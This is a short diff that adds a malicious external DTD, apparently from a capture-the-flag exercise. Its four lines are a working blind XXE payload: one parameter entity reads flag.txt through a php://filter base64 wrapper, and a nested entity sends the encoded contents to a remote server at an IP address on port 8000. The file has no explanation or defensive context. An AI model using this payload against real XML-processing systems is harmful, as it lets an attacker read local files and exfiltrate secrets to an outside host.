@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt">
+<!ENTITY % subfunc '<!ENTITY &#37; exfil SYSTEM "http://18.189.114.143:8000/?data=%data;">'>
+%subfunc;
+%exfil;
